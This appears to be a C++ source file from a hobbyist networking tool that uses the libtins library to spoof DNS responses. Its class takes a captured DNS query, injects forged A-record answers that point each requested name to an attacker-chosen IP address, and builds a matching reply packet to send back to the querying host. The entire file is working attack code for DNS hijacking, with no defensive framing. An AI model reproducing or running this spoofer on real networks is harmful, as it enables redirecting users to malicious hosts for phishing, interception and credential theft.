/* DNS Query spoof
* by Bastian Karschat
* heres my code :*
*/

#include "DNSQuerySpoof.hpp"


DNSQuerySpoof::DNSQuerySpoof() {

}

DNSQuerySpoof::DNSQuerySpoof(Tins::EthernetII &packet, int ttl, std::string ip_to_spoof) {
    m_packet_to_spoof = packet;
    m_time_to_live = ttl;
    m_ip_to_spoof = ip_to_spoof;
    do_query_spoof();
}

DNSQuerySpoof::~DNSQuerySpoof() {

}


void DNSQuerySpoof::do_query_spoof() {
    Tins::IP ip_header = m_packet_to_spoof.rfind_pdu<Tins::IP>();
    Tins::UDP udp_header = ip_header.rfind_pdu<Tins::UDP>();
    Tins::DNS dns_payload = udp_header.rfind_pdu<Tins::DNS>();

    //is there a query?
    if (dns_payload.type() == Tins::DNS::QUERY) {
        for (const auto &query : dns_payload.queries()) {
            if (query.query_type() == Tins::DNS::A) {
                //add spoofed answer
                dns_payload.add_answer(
                        Tins::DNS::resource(query.dname(), m_ip_to_spoof, Tins::DNS::A, query.query_class(),
                                            m_time_to_live));
            }
        }
        if (dns_payload.answers_count() > 0) {
            dns_payload.recursion_available(1);
            dns_payload.type(Tins::DNS::RESPONSE);
            m_spoofed_packet = Tins::EthernetII(m_packet_to_spoof.src_addr(), m_packet_to_spoof.dst_addr()) /
                               Tins::IP(ip_header.src_addr(), ip_header.dst_addr()) /
                               Tins::UDP(udp_header.sport(), udp_header.dport()) / dns_payload;
        }
    }
}

void DNSQuerySpoof::set_Query(Tins::EthernetII &packet) {
    m_packet_to_spoof = packet;
}


void DNSQuerySpoof::set_spoofed_ip(std::string ip) {
    m_ip_to_spoof = ip;
}

void DNSQuerySpoof::set_time_to_live(int ttl) {
    m_time_to_live = ttl;
}

Tins::EthernetII DNSQuerySpoof::get_Answer() {
    return m_spoofed_packet;
}
